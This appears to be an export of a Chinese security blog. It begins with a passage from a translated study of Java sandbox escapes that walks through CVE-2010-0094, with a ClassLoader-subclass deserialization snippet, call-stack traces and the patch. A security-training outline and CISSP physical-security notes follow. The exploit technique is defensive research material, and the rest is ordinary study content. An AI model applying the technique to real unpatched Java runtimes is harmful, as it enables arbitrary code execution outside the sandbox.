Java允许在运行时将对象转换为字节流，这对于持久性和网络通信非常有用。将对象转换为字节序列称为串行，并且将字节流转换为对象的相反过程称为反序列化。在特权上下文中完成反序列化过程的一部分可能会发生。分析人员可以通过实例化由于缺少权限而通常不允许实例化的对象来利用这一点。一个典型的例子是类java.lang.ClassLoader。分析人员（总是在没有权限的情况下）不能直接实例化ClassLoader的子类_S_，因为ClassLoader的构造函数检查调用者是否具有CREATE_CLASSLOADER权限。但是，如果他找到了在特权上下文中反序列化_S_的序列化版本的方法，他可能最终会得到_S_的实例。请注意，_S_的序列化版本可以由攻击范围之外的分析人员创建（例如，在他自己的机器上，没有沙箱的JVM）。在攻击期间，序列化版本只是表示_S_实例的数据。在本节中，我们将展示如何利用CVE-2010-0094来使用系统代码，该系统代码对特权上下文中分析师提供的数据进行反序列化。这可用于执行任意代码，从而绕过所有沙箱限制。 4.4.2 示例：CVE-2010-0094 漏洞CVE-2010-0094位于方法RMIConnectionImpl.createMBean（String，ObjectName，ObjectName，MarshalledObject，String[]，Subject）中。MarshalledObject类型的第四个参数包含对象_S_的字节表示，该对象在特权上下文中进行反序列化（在具有所有权限的doPrivileged（）调用内）。分析人员可以传递任意对象来创建用于反序列化的MBean（）。在我们的例子中，他传递了java.lang.ClassLoader的子类：12public class S extends ClassLoader implements Serializable &#123;&#125; 在易受攻击的JVM版本（例如1.6.0_17）中，实例化对象_S_时的调用堆栈如下： 1234567891011121314151617181920212223242526272829303132 1: Thread [main] (Suspended (breakpoint at line 226 in ClassLoader)) 2: S(ClassLoader).&lt;init&gt;() line: 226 [local variables unavailable] 4: GeneratedSerializationConstructorAccessor1.newInstance(Object[]) line: not available 6: Constructor&lt;T&gt;.newInstance(Object...) line: 513 7: ObjectStreamClass.newInstance() line: 924 8: MarshalledObject$MarshalledObjectInputStream (ObjectInputStream).readOrdinaryObject(boolean) line: 173710: MarshalledObject$MarshalledObjectInputStream (ObjectInputStream).readObject0(boolean) line: 132912: MarshalledObject$MarshalledObjectInputStream (ObjectInputStream).readObject() line: 35114: MarshalledObject&lt;T&gt;.get() line: 14215: RMIConnectionImpl$6.run() line: 151316: AccessController.doPrivileged(PrivilegedExceptionAction&lt;T&gt;) line: not available [native method]18: RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader, Class&lt;T&gt;) line: 150520: RMIConnectionImpl.access$500(MarshalledObject, ClassLoader, Class) line: 7222: RMIConnectionImpl$7.run() line: 154823: AccessController.doPrivileged(PrivilegedExceptionAction&lt;T&gt;) line: not available [native method]25: RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader, ClassLoader, Class&lt;T&gt;) line: 154427: RMIConnectionImpl.createMBean(String, ObjectName, ObjectName, MarshalledObject, String[], Subject) line: 37629: Exploit.exploit() line: 7930: Exploit(BypassExploit).run_exploit() line: 2431: ExploitBase.run(ExploitBase) line: 2032: Exploit.main(String[]) line: 19 我们观察到反序列化发生在特权上下文中（在第16行和第23行的doPrivileged（）内）。请注意，它是ClassLoader类（（），可信代码）的构造函数，它位于堆栈上，而不是_S_（分析器类，不可信代码）的构造函数。请注意，在第2行“S（ClassLoader）”表示ClassLoader在堆栈上，而不是_S_。如果_S_已经在堆栈上，ClassLoader构造函数中的权限检查会抛出安全异常，因为不受信任的代码（因此没有权限）在堆栈上。为什么_S_不在调用堆栈上？答案由序列化协议的文档给出。它表示被调用的构造函数是没有实现Serializable接口的类层次结构的第一个构造函数。在我们的示例中，_S_实现Serializable，因此不会调用其构造函数。_S_扩展ClassLoader，它不实现Serializable。因此，反序列化系统代码调用ClassLoader的空构造函数。因此，堆栈跟踪仅在特权上下文中包含堆栈上的受信任系统类（在doPrivileged（）之后可能存在不受信任的代码，因为在检查调用堆栈时，权限检查将在doPrivileged（）方法处停止）。ClassLoader中的权限检查将成功。 但是，稍后在系统代码中，_S_的这个实例被强制转换为_S_的类型，而不是ClassLoader。那么，分析师如何检索这个实例呢？一种解决方案是向_S_添加静态字段以及向_S_类添加方法以在静态字段中保存_S_实例的引用： 1234567public class S extends ClassLoader implements Serializable &#123; public static S myCL = null; private void readObject(java.io.ObjectInputStream in) throws Throwable &#123; S.myCL = this; &#125;&#125; readObject（）方法是在反序列化期间调用的特殊方法（通过上面调用堆栈中第8行的readOrdinaryObject（））。此时没有进行权限检查，因此不受信任的代码（S.readObject（）方法）可以在调用堆栈上。 分析师现在可以访问_S_的实例。由于_S_是ClassLoader的子类，因此分析人员可以定义具有所有权限的新类并禁用安全管理器（类似于3.1.1节中的方法）。此时，沙箱被禁用，分析师可以执行任意代码。 此漏洞影响14个Java 1.6版本（从版本1.6.0_01到1.6.0_18）。它已在版本1.6.0_24中得到纠正。 以下“功能”的组合使分析师能够绕过沙箱：（1）可信代码允许对不可信代码控制的数据进行反序列化，（2）在特权上下文中进行反序列化，以及（3）通过以下方式创建对象：反序列化的方法遵循与常规对象实例化不同的过程。 漏洞CVE-2010-0094已在Java 1.6.0更新24中得到修复。对doPrivileged（）的两次调用已从代码中删除。在修补版本中，当初始化ClassLoader时，权限检查失败，因为现在检查整个调用堆栈（请参阅下面的新调用堆栈）。第21行及以下的不受信任的代码没有CREATE_CLASSLOADER权限。 123456789101112131415161718192021222324 1: Thread [main] (Suspended (breakpoint at line 226 in ClassLoader)) 2: MyClassLoader(ClassLoader).&lt;init&gt;() line: 226 [local variables unavailable] 4: GeneratedSerializationConstructorAccessor1.newInstance(Object[]) line: not available 6: Constructor&lt;T&gt;.newInstance(Object...) line: 513 7: ObjectStreamClass.newInstance() line: 924 8: MarshalledObject$MarshalledObjectInputStream (ObjectInputStream).readOrdinaryObject(boolean) line: 173610: MarshalledObject$MarshalledObjectInputStream(ObjectInputStream) .readObject0(boolean) line: 132812: MarshalledObject$MarshalledObjectInputStream(ObjectInputStream) .readObject() line: 35014: MarshalledObject&lt;T&gt;.get() line: 14215: RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader, Class&lt;T&gt;) line: 152317: RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader, ClassLoader, Class&lt;T&gt;) line: 155919: RMIConnectionImpl.createMBean(String, ObjectName, ObjectName, MarshalledObject, String[], Subject) line: 37621: Exploit.exploit() line: 7922: Exploit(BypassExploit).run_exploit() line: 2423: ExploitBase.run(ExploitBase) line: 2024: Exploit.main(String[]) line: 19 4.4.3 讨论 此漏洞表明序列化协议的特性（仅调用特定构造函数）可以与易受攻击的系统代码一起利用，该代码在特权上下文中对分析师控制的数据进行反序列化，以绕过沙箱并运行任意代码。由于序列化协议由于向后兼容性原因而无法轻松修改，因此已修补易受攻击的代码。 5 结论 在本文中，我们专注于Java平台的复杂安全模型，该模型已经被攻击了大约20年。我们展示了该平台包含本机组件（如Java虚拟机），以及大量Java系统类（JCL），并且对系统的两个部分进行了广泛的不同攻击。这包括低级攻击，例如内存损坏漏洞，以及对策略实施的Java级攻击，例如可信方法链攻击。这突出了保护平台实际使用的任务是多么困难。 我们将本文作为案例研究进行了介绍，以说明诸如Java平台之类的复杂系统如何安全地包含潜在恶意代码的执行。希望这篇对过去Java漏洞利用的概述提供了有助于我们在未来设计更强大系统的见解。]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>Java沙箱逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全培训大纲]]></title>
    <url>%2FSecurity%2F%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2%2F</url>
    <content type="text"><![CDATA[安全培训大纲 邮件安全 钓鱼邮件 邮件伪造 第三方转存 检查发件人 开启二次验证 邮件转发 第三方代收 邮件附件敏感信息加密 病毒防范 什么是木马病毒 我安装哪些杀毒软件？ 定期更新病毒库 浏览器安全 不浏览恶意网站 不从恶意网站下载软件 下载软件从官网下载 信息泄露 敏感数据上传到云笔记、GitHub 共享账号 使用公司邮箱注册外部账号或者私人账号 社交网络发布公司技术解决方案&amp;保密产品信息 公司账号和私人账号要隔离 打印后及时取走 个人电脑安全 锁屏幕 不轻易插入陌生U盘 及时的系统更新 不从外部下载破解软件(有需要请找IT同学) 不将公司数据带离工作场所 电脑要加开机密码，防止电脑丢失后造成数据泄露 企业微信、微信、QQ、QQ群文件发送文件要打包加密 工作文档加密盘（利用如TrueCrypt的之类的加密软件） 密码泄露 根据调查显示目前全世界泄露账号密码以及个人隐私有800亿条 密码使用超过12位以上使用特殊字符、大小写字母和数字 密码不要与公司内部密码有关联 密码三个月要更换一次 WiFi安全 不连接不可信WiFi 连接不可信WiFi后需要连接VPN 不要在工作区私自桥接，共享办公网WIFI 不要使用WIFI万能钥匙等共享密码的APP VPN以及OA安全 VPN账号和OA账号仅自己持有 任何人不会和你以任何理由要VPN以及OA账号 VPN的动态验证短信不转发给其他人 客服注意事项 我在和谁聊天 确定对方身份的流程 我可以提供哪些信息 敏感操作回拨验证人员身份 物理安全 门禁 碎纸机（防止泄露商业信息） 视频监控 禁止人员尾随进入工作区 WEB安全开发 XSS跨站漏洞 SQL注入 跨站请求伪造漏洞 支付逻辑漏洞 越权漏洞 平行权限 验证码逻辑漏洞 API未限速漏洞 GitHub敏感信息泄露 法律风险意识 APP安全开发 数据安全 存储 传输 使用 验证 代码安全 逆向 调试 重新打包 环境特性 系统 组件 权限 端口 业务安全 逻辑漏洞 策略 合规 安全运维 服务器安全 MFA登录 使用key登录 禁止弱密码登录 禁用无用账号 账号锁定策略（防止暴力破解，ssh:fail2ban） 检查特殊账号（空口令） 禁止root远程登录 关闭非必须服务器服务 安装IDS/IPS系统 进行日志收集 更新 系统版本要尽量贴近官方版本 软件版本（例如：php）要及时升级 日志 收集全面 实时传输 重点日志例如 ssh 内核日志 业务日志 业务日志要脱敏 软件安装 只允许可信软件源 需要新软件需要经过安全评估 业务代码尽量不使用root权限运行 网络安全 ACL限制不需要互相访问的业务通讯 安全组不要附加 snmp修改团体名称 数据安全 杜绝弱口令 禁止匿名用户 数据库加密（按照最小化权限原则） Redis必须加密 大数据服务必须有鉴权 MongoDB必须加密码 流程安全控制 运维准入 域名开通流程 VPN申请流程 跳板机申请流程 物理安全 机房服务器不允许使用USB接口 VGA显示器应该处于退出状态 产品经理安全培训 敏感信息泄露 调试开关 防重签名 http-dns 数据包劫持 登录机制安全性 防暴力破解 时间窗口合理性 不要成为短信轰炸机 任意用户密码重置]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>SDL</tag>
        <tag>安全培训</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cissp学习笔记（10）——物理安全需求]]></title>
    <url>%2Fnotes%2Fcissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8810%EF%BC%89%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82%2F</url>
    <content type="text"><![CDATA[在本章的考试大纲内容有：3) 安全工程(安全的工程学和管理) J. 应用安全原则到场所和设施设计中 K. 设计和应用物理安全 K.1 配线柜 K.2 服务器机房 K.3 介质存储设施 K.4 证据存储 K.5 受限和工作区域安全(例如，运营中心) K.6 数据中心安全 K.7 基础设施和HVAC注意事项 K.8 水的问题(例如，漏水和水灾) K.9 火灾预防、检测和抑制7) 安全运营(例如，基本概念、调查、实践管理、灾难恢复) O. 应用和管理物理安全 O.1 周边(例如，访问控制和监控) O.2 内部安全(例如，陪同要求/访问控制、钥匙和锁) 10.1 应用安全原则到选址和设施设计10.1.1 安全设施计划 安全设施计划描述了组织的安全要求的轮廓，并且着重强调为了提供安全性所用的方法和机制。关键路径分析是一种系统工作，可以确定关键任务应用、过程和操作以及所有必要的支持要素之间的关系。当正确执行关键路径分析时，支撑组织的必要的相互依赖和相互作用就会形成。一旦分析完成，那么结果将作为一列安全条目提供服务。在检查关键路径时，己完成的评估或潜在的技术融合是很重要的。技术融合是不同的技术、解决方案、工具和系统在随着时间的推移进行发展和合井的趋势。安保人员应参与场所和设施的设计考虑。否则，对于现存的逻辑安全，在许多物理安全方面的内容可能会被忽略。 10.1.2 场所选择 场所的选择应该以组织的安全需要为基础。成本、地点和大小都很重要，但是解决安全要求始终应当放在首位。在整个场所选择过程中，场所的位置和构造起到了至关重要的作用。毗邻其他建筑物和业务是另一个至关重要的考虑因素。至少要确保建筑物的设计要求能够应对极端的天气，并且能够阻拦或防御明显的非法闯入企图。容易受到攻击的进入位置(例女日，窗户和门)往往就是此类分析。此外，还应当评估非法闯入容易借助的遮挡视线的物体(例如，树木、灌木或人为因素) 。 10.1.3 可视性 可视性是十分重要的。必须对周围地形、周围区域的组成、紧急事件服务机构、潜在危险等进行分析。 10.1.4 自然灾害 必须准备应付自然灾害，并且使町环境经受得住灾害事件的影响，或者可以容易地进行替换。 10.1.5 设施的设计 在进行设施的设计时，需要理解组织所需的安全等级。在设计开始之前，必须计划并设计恰当的安全等级。”安全架构”经常被称为环境设计预防犯罪(Crime Prevention Through Environmental Design，CPTED)。指导思想是通过结构化的物理环境和周围环境，在潜在的罪犯做出任何犯罪行为之前影响其个人决定。 10.2 设计和实施物理安全 用于对物理安全进行管理的安全控制可以分为三组： 行政性的、技术性的和物理性的。由于它们都用于描述访问控制的相同类别，因此记住这些分组的物理安全特性是十分重要的。为具体环境设计物理安全性时，需要牢记控制措施的功能顺序： 阻拦 拒绝 检测 延缓 10.2.1 设备故障 系统返回到完整的正常功能状态的响应时间与这种解决方案所涉及的维护成本成正比。成本包括存储、运输、预先购买以及维护现场安装和恢复专业技术。在某些情况中，维护现场替换是不可行的。对于这种情况，与硬件供应商签订服务级别协议(SLA)是十分必要的。SLA 清楚地定义了供应商在发生设备故障的紧急情况下所提供的响应时间。对老化的硬件进行替换和/或修理应该制定时间表。这些操作的时间表应该以为每种设备估计的平均无故障时间(Mean Time To Failure，MTTF)和平均修复时间(Mean Time To Repair，MTTR)为基础。设备送外修复时，需要在修复期间使用替代的解决方案或备份设备。通常，在出现小故障时进行修理是可以接受的，但是等到出现大故障时再进行更换，就是一种无法接受的安全实践。 10.2.2 配线间 现代的配线间是整个建筑或一个楼层中连接到其他重要设备的网络电缆所在的地方，如配线架、交换机、路由器、局域网扩展和骨干渠道。配线间一个更专业的技术名称是房屋线缆分布室。为了保证最大线缆传输限制，大型建筑物里需要多个配线间。配线间的安全是非常重要的。大部分的安全重点是在防止未授权的物理访问方面。如果一个未授权的入侵者获准访问该地区，他们可能偷取设备、拖拉或切断电缆，甚至安放窃听设备。因此，配线间的安全策略应包括如下可靠规则： 不把配线间作为通用的存储区。 足够多的锁。 持区域的整洁。 不要存放易燃易爆物品。 设置视频来监控内部的配线间活动。 使用开门传感器来记录日志。 不要把钥匙给除了授权管理人员之外的任何人。 对配线间的安全和内容进行定期的物理检查。 把配线间纳入组织的环境管理和监控，以确保有适当的环境控制和监控，以及检测破坏性条件，如洪水或火灾。 10.2.3 服务器机房 服务器机房、数据中心、通信机房、配线间、服务器保管室和π 机房是被封闭的、受限的和受保护的房间，这里放置着关键的服务器和网络设备。集中化的服务器机房不需要与人相协调。服务器机房应设在建筑物的核心位置。尽量避免放置在底层、顶层和地下室。此外，服务器机房应远离水、气和污水管道，这些管道泄漏或泛滥的风险太大，可能会造成严重的损坏和故障停机时间。 10.2.4 介质存储设施 把介质存放在上锁的柜子或保险箱中。 有库管理员或保管员来管理对带锁的介质柜的访问。 使用存入/取出流程来跟踪谁在检索、使用和返回存储介质。 对于重用介质，当被返还时，运行安全磁盘擦除或归零(通过无意义的数据(比如零)来取代擦除数据的过程)过程来删除所有残留数据。 10.2.5 证据存储 安全证据存储可能涉及以下： 一个专用的存储系统以区别于生产网络 当没有新的数据集传输到存储系统时就将存储系统离钱 阻断存储系统和互联网的连接 跟踪证据存储系统的所有活动 计算存储在系统中所有数据的哈希值 限制安全管理员和法律顾问的访问 对所有存储在系统上的数据进行加密 10.2.6 受限的和工作区域安全(例如，运营中心) 工作区和参观区域的设计和配置都应该仔细考虑。对设施内所有地方的进入要求不应该等同对待。进入含有更高价值或重要资产的区域应该受到限制。有价值的和保密的资产应该放置在设施的核心保护区或中心地区。实际上，应该专注于部署物理保护的同心圆。这种配置类型要求较高的授权级别才能进入组织的更敏感区域。设施安全设计过程应该支持内部安全的实施和维护。除了在适当的工作场所管理员工外，还应该解决访客和访客控制问题。 10.2.7 数据中心安全1. 智能卡 智能卡是信用卡大小的身份证、员工证或安全通行证，卡上具有磁条、条形码或植入的集成电路芯片。智能卡包含了经过授权的可以被用于身份识别和/或身份认证目的的持卡人信息。某些智能卡甚至具有处理信息的能力或被用于在内存芯片上存储一定数量的数据。下列短语或术语指的都是智能卡： 包含集成电路(IC)的身份令牌 处理器IC卡 具有ISO 7816接口的IC卡 大多数情况下，智能卡被用于多因子配置，因此，智能卡被盗或丢失不容易发生冒名替代的后果。最常见的用于智能卡的多因子认证要求使用PIN。 2. 接近式读卡机 接近式读卡机可以是无源设备、场源设备或发送应答器。接近式设备由经过授权的持卡人携带或持有，当持卡人通过接近式读卡机时，接近式读卡机能够确定持卡人的身份及其是否己被授权进行访问。无源设备不具有活动电子，只是具有特定属性的小磁场(如DVD 上常见的防盗设备)。场源设备是一种电子设备，当进入由读卡机产生的电磁场时会被激活。发送应答器是自有电源的设备，并且发射由读卡机接收的信号。除了智能卡、无记忆卡和接近式读卡机以外，还可以使用无线射频识别(RFID)或生物测定学方面的访问控制设备来管理物理访问。 3. 入侵检测系统 入侵检测系统是自动化的或人工的系统，这种系统被设计用于检测未经授权的个人企图发起的入侵、破坏或攻击行为，未授权入口点的使用情况，以及在未经授权的时间或非正常时间发生的犯法事件。物理的入侵检测系统也被称为防盗警报器，用于检测未经授权的活动并通知管理机构(内部的安全部门或外部的执法部门)。 4. 访问滥用 物理访问控制的滥用示例包括敞开安全门、绕过锁或访问控制。伪装是指使用其他人的安全ID获得进入某座设施的权限。尾随是指跟随着某个人通过受到安全保护的门或通道，而自己并没有接受身份识别或身份认证。这样的检测滥用可以通过建立审计跟踪和保持访问日志来完成。 5. 放射防护 用于阻止放射攻击的对策和防护类型被称为瞬时电磁脉冲设备屏蔽技术TEMPEST设备。TEMPEST的一些对策有法拉第笼、白噪声和控制区： 法拉第笼 通常是完全包围区域所有面的金属网。这个金属外壳具有能够产生电容效应(因此以法拉第命名)的弱电，从而可以防止所有电磁信号(放射信号)逸出或进入由法拉第笼围绕的区域。法拉第笼能够非常有效地阻拦EM信号。事实上，在有效的法拉第笼的内部，移动电话无法使用，并且无法接收广播或电视信号。 白噪声 白噪声指的是一直广播虚假通信数据，从而掩盖和隐藏实际存在的放射信号。白噪声可以由另一个非机密来源的实际信号、特定频率的连续信号、随机的可变信号(例如，在广播电台或电视台之间听到的自噪声)甚至导致截获设备失效的干扰信号组成。在区域边界的周围生成白噪声是最为有效的，此时白噪声通过向外广播以保护需要放射信号才能完成正常运作的区域内部。 控制区 控制区是第三种TEMPEST对策，它只是在受保护区域环境内实现法拉第笼或白噪声，在受保护区域环境外则不采取任何措施。控制区是所需设备使用和支持放射信号的区域(例如，无线互联、移动电话、无线电和电视信号)。在控制区外部，我们需要使用不同的TEMPEST对策来阻止对放射信号的拦截。 10.2.8 基础设施和HVAC注意事项 电力公司供应的电源并不总是连续的和平稳的。大多数电子设备需要平稳的电力供应才能正常工作。由于电源的波动而导致设备损坏的事情经常发生。不间断电源供应(Uninterruptible Power Supply，UPS)是一种自充电的电池类型，可以为敏感的设备提供连续和平稳的电力。另一种确保设备不会因为电源波动而造成损坏的方法是使用带有电涌保护器的配电盘。电涌保护器包含一根保险丝，它在电源功率剧烈变化而造成对设备的损坏之前熔断。但是一旦电涌保护器的保险丝熔断或电路因跳闸切断，电流就会被完全中断。如果希望维持很长时间的电力并且不会造成停电，那么需要一台现场发电机。大多数发电机运转时都使用液态或气态的燃料水槽，为了保证可靠性，必须维持充足的燃料。发电机被认为是电源的替换或后备方案。与电源相关的问题有很多。下面是应当熟悉的一组电源术语： 故障(fault) 电力瞬间消失 中断(blackout) 电力完全消失 电压不足(sag) 瞬间电压降低 降压(brownout) 长时间低电压 脉冲(spike) 瞬间高电压 电涌(surge) 长时间高电压 起动功率(inrush) 电源开始的电涌通常与连接的电源有关，无论电源是主电源还是替换/辅助电源 噪声(noise) 持续不断的电源干扰 瞬时现象(transient) 短时间的线路杂音干扰 平稳(clean) 完全平稳的电流 接地(ground) 电路中的电线是接地的 1. 噪声 噪声造成的问题不仅会影响设备的功能，还可能会干扰通信、传输和播放的质量。电磁干扰(EMI)有两种类型： 普通模式和导线模式。普通模式的噪声是由电源或运转的电子设备的火线和地线之间的电势差产生的。导线模式的噪声是由电源或运转的电子设备的火线和中线之间的电势差产生的。与此类似的问题是射频干扰(RFI)，它与EMI一样，会影响许多系统。RFI由很多常见的电器产生。保护电力供应和保护设备不受到噪声干扰，这是为IT基础设施维护高效和功能稳定的环境的重要部分。这种保护措施所采取的步骤包括： 提供充足的电力条件，建立合适的接地措施，屏蔽所有电缆，以及限制暴露在EMI和RFI源中。 2. 温度、湿度和静电 除了考虑电源问题，维护环境还包括控制来暖、通风和空调(HVAC)的机制。湿度太高会导致侵蚀，湿度太低则会产生静电。即使在不产生静电的地毯上，如果环境中的湿度太低，那么仍然可能产生两万伏特的静电放电。 10.2.9 水的问题(例如，漏水和水灾) 只要有可能，就要将放置服务器的房间和重要计算机设备远离任何水源或传输管道。还可能希望在关键任务系统的地板周围安装水检测电路。水检测电路具有警报装置，如果水正在侵入设备，那么就会发出警报。 10.2.10 火灾的预防、检测和抑制 不同的抑制介质针对火的不同方面： 水能够抑制高温 苏打酸和其他干粉能够抑制燃料供应 二氧化碳能够抑制氧气供应 哈龙替代物与其他非易燃气体能够干扰化学燃烧和/或抑制氧气供应 1. 灭火器 级别 火灾类型 灭火材料 A 普通的易燃品 水、苏打酸(干粉或液态化学物质) B 液体 二氧化碳、哈龙*、苏打酸 C 电子 二氧化碳、哈龙* D 金属 干粉 哈龙或EPA 批准的哈龙替代物 2. 防火检测系统 当达到某一特定温度时，设定好温度的检测系统就会触发灭火抑制装置。触发器通常是带洒水头的金属或塑料元件，在某一特定的温度下会融化。温度上升比率检测系统在温度的改变速度达到某一特定级别时就会触发灭火抑制装置。火焰激发系统是根据火焰的红外线能量来触发灭火抑制装置。烟感系统则根据光电或放射性电离传感器来触发灭火抑制装置。大多数防火检测系统可以与火灾响应服务通知机制链接在一起。在灭火抑制装置被触发时，这些链接在一起的系统会通过发出自动的消息或警报来通知本地的火灾响应团队以及请求援助。 3. 放水灭火系统 湿管道系统(也称为封闭头系统)总是充满了水。当灭火装置被触发时，就会立刻放水。 干管道系统中包含被压缩的空气。一旦灭火装置被触发，空气泄漏，打开水间，从而使管道充满水井放出水来。 洪水系统是干管道系统的另一种形式，它使用较粗的管道，因此能排出大股的水流。洪水系统对于放置了电子设备和计算机的环境不太适合。 预先响应系统是干管道/湿管道系统的组合系统。这种系统一直作为干管道系统存在，直至检测到有火灾(烟、热及其他)发生，然后向管道中充满水。由于充分受热，洒水头触发器被融化之后释放出水。如果在洒水头被触发之前火被熄灭，那么管道可以被手工排空并重新设置。这种系统还允许在洒水头触发之前进行人工干预，以便停止放水。 4. 气体释放系统 气体释放系统通常比放水系统更有效。然而，气体释放系统不应当被部署在有人的环境中。气体释放系统通常从空气中抽走氧气，因此对人是非常危险的。 5. 损失 火灾引起的破坏性要素包括烟和热，还包括灭火抑制介质(如水或苏打酸)。烟对大多数存储设备都会造成损坏。热会损坏所有的电子或计算机组件。灭火抑制介质可能会引起电路短路、加快侵蚀或导致设备无法使用。在设计火灾响应系统时，必须考虑上述所有问题。 10.3 实施和管理物理安全10.3.1 周边(例如，访问控制和监控) 建筑物或校园位置的入口也很重要。单入口可极大地提供安全性，但多个入口在紧急情况下可提供更好的疏散性。 1. 栅栏、大门、旋转门和陷阱 栅栏是外围设备。栅栏被用于在受到特殊安全保护级别的区域和其他区域之间进行明确的隔离。用栅栏筑围墙可以包括广泛的成分、材料和建造方法，可能包括地上的画线、铁丝网、带刺铁丝网、水泥墙和使用激光、运动探测仪或热源探测仪的不可见防线。大门是栅栏上受到控制的出入点。为了维持栅栏整体的有效性，大门的阻挡程度必须与栅栏的阻挡程度相同。绞链和锁闭/闭合机制应该进行加固，以防止损坏、破坏或拆卸。当大门关闭时，不应该提供任何额外的出入脆弱性。门的数量应当尽可能最少。旋转门每次只可以进一个人，并且常常限制为单方向转动。要么只允许进门，要么只允许出门。旋转门基本上可以等同于安全的旋转门。陷阱是通常由保安人员守护的双重门设置。陷阱的目的是牵制主体，直至其身份得到确认和验正。如果经过证明他们可以被授权进入，那么内部的门打开，从而准许这些人员进入设施或周围的附属地区。如果他们没有得到授权，那么两扇门都保持关闭并锁住，直至警卫(通常是保安人员或警察)到来将这些闯入者护送离开设施或因非法入侵逮捕他们(这也被称为迟滞特性) 。通常，陷阱包括阻止跟随捎带和尾随的措施。 2. 照明 照明是最常用的一种边界安全控制形式。照明的主要目的是阻拦那些偶然的入侵者、闯入者、小偷和希望在黑暗中实施恶意行为的潜在窃贼。照明应当不照亮保安人员、看门狗、巡逻岗哨或其他类似的安全保卫者。此外，在攻击者非法闯入期间，照明也不能因为强光或反射使保安人员、看门狗和监控设备受到干扰，否则更利于攻击者。 3. 保安和看门狗 所有的物理安全控制，无论是静止的阻碍物还是主动的检测和监视机制，最终都要依靠人的介入来阻止实际的入侵和攻击。保安可能沿边界进行部署，或者被部署在边界内。他们监视着进出口，或者监控着进行检测和监视的显示器。保安的真正优势在于他们能够适应任何环境或情况并做出反应。保安能够记住并识别攻击和入侵的行为和方式，可以适应正在改变的环境，并且能够作出判断和决定。在需要立即的、现场的事态控制和决策制定时，保安常常是恰当的安全控制选择。不是所有的环境和设施都支持部署保安。这可能是由于实际环境中存在不适合人的因素，或是设施的规划、设计、位置和建筑的原因。不是所有的保安都是可信赖的。预先筛选、联系和培训无法保证不会出现低效的和不可靠的保安。看门狗可以替代保安，它们常常作为边界的安全控制措施进行部署。作为侦测和威慑的一种形式，看门狗是非常有效的。然而，喂养狗的费用很高，并且需要高标准的养护，同时还会带来极高的保险和责任要求。 10.3.2 内部安全(例如，陪同要求/访问者控制、钥匙和锁)1. 钥匙和密码锁 锁使得被关闭的门保持闭合。它们被用于阻止缺乏正确授权的人。锁是身份标识和身份认证机制的强硬形式。只有具有正确的钥匙或密码，才会被授权准许进入。使用钥匙的锁是最常见的和最廉价的物理访问控制设备形式，常常被称作预置锁。可编程的锁或密码锁能够提供比预置锁更广泛的控制。电子访问控制(EAC)锁由下列三种元素组成： 保持门关闭的电磁体、验证主体和使电磁体失效的凭证读卡机，以及重新使用电磁体的闭门感应器。 2. 员工证 员工证、身份证或安全ID都是物理身份标识和/或电子访问控制设备的形式。员工证可能被用在物理访问主要受到保安控制的环境中。员工证还可以在由扫描设备守卫而非保安守卫的环境中使用。 3. 运动探测仪 运动探测仪或运动传感器是在特殊区域内使用的、用于感知物体运动的设备。运动探测仪的常见类型如下： 红外运动探测仪 对被监控区域红外照明模式的显著变化进行监视。 热能型运动探测仪 对被监控区域内的热能等级和模式的显著变化进行监视。 波形运动探测仪 向被监控的区域发射连续的弱超声波或高频微波，并且对反射波的显著扰动或变化进行监视。 电容运动探测仪 对被监控物体周围区域的电场或磁场变化进行探测。 光电运动探测仪 通常在没有窗户或保持昏暗的房间内部使用。 无源音频运动探测仪 对被监控区域内的非正常声音进行侦听。 4. 入侵警报 警报是一种分离机制，可以引发威慑、防护和/或通知。 威慑报警 引发威慑警报可能会采用额外的加锁、关门等措施。这种警报的目的是使得进一步的入侵或攻击变得更难。 排斥报警 引发排斥警报声通常听起来像汽笛或钟声，并且会将灯打开。这些警报类型被用于令入侵者或攻击者气馁，从而不再继续他们的恶意或入侵行为，并且离开这个设施。 通知报警 引发通知警报对于入侵者汇攻击者来说常常是缄默的，但是它们会记录事故的相关数据，并且通知管理员、保安和执法机构。事故的记录可以采取日志文件和/或闭路电视磁带的形式。缄默警报的目的是将授权的安全人员带到入侵或攻击的位置，以便期望抓住进行有害活动的人。 报警也通过它们所在的地方(本地、集中、专有或辅助)被归类。 本地报警 本地警报系统必须广播司听到的警报信号(最大可到120分贝)，这个信号最远可以传播400英尺。此外，本地警报系统必须受到保护，通常应由保安进行保护，以防止损害和损坏。为了使警报系统有效，附近必须有安全团队或保安，他们可以在警报被触发后立即进行响应。 集中式警报系统 可能在本地没有警报，在警报触发时会通过信号通知远程或集中式监控站。大多数中央集中式系统都是很知名的公司或是国家安全公司。专有系统类似于中央系统，但托管组织有他们自己的现场保安人员等待并响应安全破坏。 辅助警报系统 辅助警报系统可以加入本地或集中式警报系统。当安全边界被破坏时，紧急服务机构将被通知和对事件做出响应，并抵达相应地点。这些紧急服务机构可能包括消防、警察和医疗服务。 5. 二次验证机制 当运动检测器、传感器和报警器被使用时，二次验证机制应该在适当的位置。随着这些设备的灵敏度增高，错误触发会经常发生。使用两个或两个以上的检测和传感器系统，并要求警报发出之前的短时内有两个或两个以上的快速成功触发。这可以显著减少错误警报，并提高报警显示实际入侵或攻击的可能性。CCTV是一种安全机制，涉及运动探测器、传感器和报警器。然而，CCTV并不是自动化的检测和响应系统。CCTV需要人员观看捕获的批频来检测可疑和恶意的活动，并触发报警。安全摄像头可以扩大保安人员的有效可见范围，因此增大了监控的范围。用来作为一个二次或后续机制，当自动化系统触发后进行审查。事实上，审计和审计跟踪的使用逻辑同样用于CCTV 和事件记录。CCTV 是预防措施，而审查事件记录是检测措施。 6. 环境和生命安全 